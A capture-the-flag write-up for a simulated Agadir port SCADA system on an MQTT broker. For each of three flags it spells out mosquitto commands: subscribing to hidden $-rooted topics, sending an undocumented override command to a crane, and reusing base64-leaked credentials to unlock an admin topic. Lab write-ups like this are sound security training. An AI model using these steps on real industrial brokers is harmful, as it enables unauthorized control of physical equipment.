# Agadir MedPort — Writeup

Three flags on a Mosquitto MQTT broker simulating the Agadir Med
container port SCADA. One host, one port (`1884`), pure MQTT.

## Recon

Start by dumping everything:

```
mosquitto_sub -h HOST -p 1884 -t '#' -v
```

You'll see telemetry on `agadir/quay/crane1/status`,
`agadir/gate/entry/count`, `agadir/weather/wind`,
`agadir/sys/heartbeat`, and a large base64 blob on
`agadir/ops/briefing`.

**But you will NOT see flag 1 yet** — read on.

## F1 — medium  (MQTT wildcard quirk)

The MQTT 3.1.1 / 5.0 specs say:

> The Server MUST NOT match Topic Filters starting with a wildcard
> character (# or +) with Topic Names beginning with a $ character.
> [MQTT-4.7.2-1]

The simulator publishes flag 1 on `$CTF/agadir/diag/backup` every 5
seconds. A subscriber using `-t '#'` silently misses it. You have to
subscribe to the `$`-rooted tree explicitly:

```
mosquitto_sub -h HOST -p 1884 -t '$CTF/#' -v
```

Flag 1 drops.

## F2 — medium  (command injection on the crane)

The crane accepts anonymous commands on `agadir/quay/crane1/cmd`.
Normal operators send `{"action":"stop"}` or `{"action":"move","x":...}`.
The sim has an undocumented diagnostic override:

```
mosquitto_pub -h HOST -p 1884 \
  -t agadir/quay/crane1/cmd \
  -m '{"force":"override","mode":"diagnostic","op":"attacker"}'
```

The simulator replies on `agadir/quay/crane1/status` with
`{"status":"DIAGNOSTIC_MODE", ..., "audit_token":"INFODAYS{...}"}`.

(Keep your subscriber on `agadir/#` running while you publish.)

## F3 — hard  (retained creds → broker auth → privileged topic)

Two pieces to chain.

**Step 1 — decode the retained ops briefing.** The `agadir/ops/briefing`
payload you saw in recon is base64. Decode it:

```
mosquitto_sub -h HOST -p 1884 -t 'agadir/ops/briefing' -C 1 \
    | base64 -d
```

It's an internal briefing that includes `Ops user: opsadmin` and
`Ops pass: AgadirMed_<randhex>`.

**Step 2 — authenticate and unlock the vault.** The broker ACL denies
anonymous publishes to `agadir/admin/#`, but the `opsadmin` user is
allowed. Use the leaked credentials:

```
mosquitto_sub -h HOST -p 1884 \
    -u opsadmin -P 'AgadirMed_xxxxxxxx' \
    -t 'agadir/admin/vault/response' &
mosquitto_pub -h HOST -p 1884 \
    -u opsadmin -P 'AgadirMed_xxxxxxxx' \
    -t agadir/admin/vault -m 'unlock'
```

The simulator replies on `agadir/admin/vault/response`:
`VAULT_UNLOCKED token=INFODAYS{...}`.

## Hint ladder

1. *Free:* "Dump all topics first — `mosquitto_sub -t '#' -v`."
2. *Cheap:* "The MQTT spec has a very specific rule about topics that
   start with `$`. Read section 4.7.2."
3. *Medium:* "The crane accepts JSON commands. Try fields other than
   `action` — look for an override path."
4. *Expensive:* "That giant base64 blob on `agadir/ops/briefing` is
   there for a reason. Decode it, read it, then reconnect *with
   credentials*."
5. *Last resort:* "Anonymous writes to `agadir/admin/#` are ACL'd off.
   opsadmin can publish there. The vault unlocks on `unlock`."

## Why each difficulty

- **F1** is a protocol trivia exercise — solvers who only know the
  surface API of `mosquitto_sub` blow right past it; solvers who
  have actually read the spec find it immediately.
- **F2** teaches that MQTT command topics are almost never sanitized.
  A publish is a write, and the sim trusts any JSON it receives.
- **F3** is three jumps: observe a retained secret, recognize it
  as credentials, then pivot to *authenticated* MQTT and a different
  ACL scope. Straight paho/mosquitto_pub scripting once the chain is
  visible, but each step is a different skill.
